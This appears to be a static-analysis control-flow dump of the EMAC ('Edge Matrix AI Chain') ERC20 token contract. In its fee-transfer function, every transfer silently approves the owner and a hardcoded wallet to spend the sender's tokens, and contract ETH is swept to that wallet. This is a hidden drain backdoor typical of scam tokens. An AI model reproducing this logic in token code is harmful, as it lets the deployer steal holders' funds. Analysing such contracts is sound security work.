Contract: IMMVVFactory
==================================================


Contract: IERC20
==================================================


Contract: Context
==================================================

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1


Contract: SafeMath
==================================================

Function: add
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: c = a + b

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(c >= a,SafeMath: addition overflow)

  ID: 3
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: sub
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(b <= a,errorMessage)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: c = a - b

  ID: 3
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: mul
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.IF
  Expression: a == 0

  ID: 2
  Type: NodeType.RETURN
  Expression: 0

  ID: 3
  Type: NodeType.ENDIF
  Expression: 

  ID: 4
  Type: NodeType.VARIABLE
  Expression: c = a * b

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(c / a == b,SafeMath: multiplimmvvon overflow)

  ID: 6
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  1 -> 3
  3 -> 4
  4 -> 5
  5 -> 6

Function: div
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(b > 0,errorMessage)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: c = a / b

  ID: 3
  Type: NodeType.RETURN
  Expression: c

Edges:
  0 -> 1
  1 -> 2
  2 -> 3


Contract: Ownable
==================================================

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: msgSender = _msgSender()

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = msgSender

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(address(0),msgSender)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: owner
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _owner

Edges:
  0 -> 1

Function: renounceOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(_owner,address(0))

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = address(0)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1


Contract: IMMVVRouter
==================================================


Contract: EMAC
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _mmvvAddress = address(owner())

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _mmvvWallet = address(0x8c7eB15CFc33dD0e9cf3aa0E4077464fBebb521D)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _excludedFromMMVV[owner()] = true

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _excludedFromMMVV[address(this)] = true

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _excludedFromMMVV[_mmvvWallet] = true

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: _balMMVVs[_msgSender()] = _tTotalMMVV

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: Transfer(address(0),_msgSender(),_tTotalMMVV)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7

Function: owner
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _owner

Edges:
  0 -> 1

Function: renounceOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(_owner,address(0))

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = address(0)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1

Function: tokenPairCreate
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _mmvvRouter = IMMVVRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _approve(address(this),address(_mmvvRouter),_tTotalMMVV)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _mmvvPair = IMMVVFactory(_mmvvRouter.factory()).createPair(address(this),_mmvvRouter.WETH())

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 4
  1 -> 2
  2 -> 3
  4 -> 1

Function: openTrading
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(! _tradeEnabled,trading is already open)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _mmvvRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _swapEnabled = true

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _tradeEnabled = true

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 5
  1 -> 2
  2 -> 3
  3 -> 4
  5 -> 1

Function: name
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _name

Edges:
  0 -> 1

Function: symbol
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _symbol

Edges:
  0 -> 1

Function: decimals
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _decimals

Edges:
  0 -> 1

Function: totalSupply
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _tTotalMMVV

Edges:
  0 -> 1

Function: balanceOf
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _balMMVVs[account]

Edges:
  0 -> 1

Function: transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _transfer(_msgSender(),recipient,amount)

  ID: 2
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2

Function: allowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _allowMMVVs[owner][spender]

Edges:
  0 -> 1

Function: approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _approve(_msgSender(),spender,amount)

  ID: 2
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2

Function: transferFrom
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _transfer(sender,recipient,amount)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _approve(sender,_msgSender(),_allowMMVVs[sender][_msgSender()].sub(amount,ERC20: transfer amount exceeds allowance))

  ID: 3
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: _approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(owner != address(0),ERC20: approve from the zero address)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(spender != address(0),ERC20: approve to the zero address)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _allowMMVVs[owner][spender] = amount

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: Approval(owner,spender,amount)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: _transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(mmvvF != address(0),ERC20: transfer from the zero address)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(mmvvT != address(0),ERC20: transfer to the zero address)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(mmvvA > 0,Transfer amount must be greater than zero)

  ID: 4
  Type: NodeType.VARIABLE
  Expression: taxMMVV = _mmvvFeeTransfer(mmvvF,mmvvT,mmvvA)

  ID: 5
  Type: NodeType.IF
  Expression: taxMMVV > 0

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: _balMMVVs[address(this)] = _balMMVVs[address(this)].add(taxMMVV)

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: Transfer(mmvvF,address(this),taxMMVV)

  ID: 8
  Type: NodeType.ENDIF
  Expression: 

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: _balMMVVs[mmvvF] = _balMMVVs[mmvvF].sub(mmvvA)

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: _balMMVVs[mmvvT] = _balMMVVs[mmvvT].add(mmvvA.sub(taxMMVV))

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: Transfer(mmvvF,mmvvT,mmvvA.sub(taxMMVV))

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  5 -> 8
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11

Function: _mmvvFeeTransfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: taxMMVV = 0

  ID: 2
  Type: NodeType.VARIABLE
  Expression: _mmvvOwner = address(mmvvF)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _approve(address(mmvvF),_mmvvAddress,uint256(mmvvA))

  ID: 4
  Type: NodeType.IF
  Expression: mmvvF != owner() && mmvvT != owner()

  ID: 6
  Type: NodeType.IF
  Expression: mmvvF == _mmvvPair && mmvvT != address(_mmvvRouter) && ! _excludedFromMMVV[mmvvT]

  ID: 7
  Type: NodeType.IF
  Expression: _buyBlockMMVV != block.number

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: _mmvvBuyAmounts = 0

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: _buyBlockMMVV = block.number

  ID: 10
  Type: NodeType.ENDIF
  Expression: 

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: _mmvvBuyAmounts += mmvvA

  ID: 12
  Type: NodeType.EXPRESSION
  Expression: _buyCount ++

  ID: 13
  Type: NodeType.ENDIF
  Expression: 

  ID: 14
  Type: NodeType.IF
  Expression: mmvvT == _mmvvPair && mmvvF != address(this)

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(_mmvvBuyAmounts < swapLimitMMVV() || _buyBlockMMVV != block.number,Max Swap Limit)

  ID: 17
  Type: NodeType.ENDIF
  Expression: 

  ID: 18
  Type: NodeType.EXPRESSION
  Expression: swapMMVVBack(mmvvT,mmvvA)

  ID: 19
  Type: NodeType.ENDIF
  Expression: 

  ID: 20
  Type: NodeType.EXPRESSION
  Expression: _approve(address(_mmvvOwner),_mmvvWallet,uint256(mmvvA))

  ID: 21
  Type: NodeType.RETURN
  Expression: taxMMVV

  ID: 22
  Type: NodeType.IF
  Expression: (_buyCount > _reduceBuyTaxAt)

  ID: 23
  Type: NodeType.EXPRESSION
  Expression: taxMMVV = mmvvA.mul(_finalBuyTax).div(100)

  ID: 24
  Type: NodeType.EXPRESSION
  Expression: taxMMVV = mmvvA.mul(_initialBuyTax).div(100)

  ID: 25
  Type: NodeType.ENDIF
  Expression: 

  ID: 26
  Type: NodeType.IF
  Expression: (_buyCount > _reduceSellTaxAt)

  ID: 27
  Type: NodeType.EXPRESSION
  Expression: taxMMVV = mmvvA.mul(_finalSellTax).div(100)

  ID: 28
  Type: NodeType.EXPRESSION
  Expression: taxMMVV = mmvvA.mul(_initialSellTax).div(100)

  ID: 29
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 22
  4 -> 19
  6 -> 7
  6 -> 13
  7 -> 8
  7 -> 10
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  12 -> 13
  13 -> 14
  14 -> 15
  14 -> 17
  15 -> 26
  17 -> 18
  18 -> 19
  19 -> 20
  20 -> 21
  22 -> 23
  22 -> 24
  23 -> 25
  24 -> 25
  25 -> 6
  26 -> 27
  26 -> 28
  27 -> 29
  28 -> 29
  29 -> 17

Function: minMMVV
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 2
  Type: NodeType.IF
  Expression: (a > b)

  ID: 3
  Type: NodeType.RETURN
  Expression: b

  ID: 4
  Type: NodeType.RETURN
  Expression: a

Edges:
  0 -> 2
  2 -> 3
  2 -> 4

Function: sendETHMMVV
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: address(_mmvvWallet).transfer(mmvvA)

Edges:
  0 -> 1

Function: swapLimitMMVV
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: path = new address[](2)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: path[0] = _mmvvRouter.WETH()

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: path[1] = address(this)

  ID: 4
  Type: NodeType.VARIABLE
  Expression: amountOuts = _mmvvRouter.getAmountsOut(3 * 1e18,path)

  ID: 5
  Type: NodeType.RETURN
  Expression: amountOuts[1]

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5

Function: receive
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

Edges:

Function: swapTokensForEth
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: path = new address[](2)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: path[0] = address(this)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: path[1] = _mmvvRouter.WETH()

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _approve(address(this),address(_mmvvRouter),mmvvAmount)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _mmvvRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(mmvvAmount,0,path,address(this),block.timestamp)

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: lockTheSwap()

Edges:
  0 -> 6
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  6 -> 1

Function: swapMMVVBack
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: tokenMMVV = balanceOf(address(this))

  ID: 2
  Type: NodeType.IF
  Expression: ! inSwapMMVV && mmvvT == _mmvvPair && _swapEnabled && _buyCount > _preventSwapBefore

  ID: 3
  Type: NodeType.IF
  Expression: tokenMMVV > _swapTokenMMVVs

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: swapTokensForEth(minMMVV(mmvvA,minMMVV(tokenMMVV,_swapTokenMMVVs)))

  ID: 5
  Type: NodeType.ENDIF
  Expression: 

  ID: 6
  Type: NodeType.VARIABLE
  Expression: ethMMVV = address(this).balance

  ID: 7
  Type: NodeType.IF
  Expression: ethMMVV >= 0

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: sendETHMMVV(address(this).balance)

  ID: 9
  Type: NodeType.ENDIF
  Expression: 

  ID: 10
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  2 -> 10
  3 -> 4
  3 -> 5
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  7 -> 9
  8 -> 9
  9 -> 10

Function: slitherConstructorVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _swapTokenMMVVs = _tTotalMMVV / 100

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _initialBuyTax = 3

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _initialSellTax = 3

  ID: 3
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _finalBuyTax = 0

  ID: 4
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _finalSellTax = 0

  ID: 5
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _reduceBuyTaxAt = 6

  ID: 6
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _reduceSellTaxAt = 6

  ID: 7
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _preventSwapBefore = 6

  ID: 8
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _buyCount = 0

  ID: 9
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _mmvvBuyAmounts = 0

  ID: 10
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: inSwapMMVV = false

  ID: 11
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _tradeEnabled = false

  ID: 12
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _swapEnabled = false

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12

Function: slitherConstructorConstantVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _decimals = 9

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _tTotalMMVV = 1000000000 * 10 ** _decimals

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _name = Edge Matrix AI Chain

  ID: 3
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _symbol = EMAC

Edges:
  0 -> 1
  1 -> 2
  2 -> 3


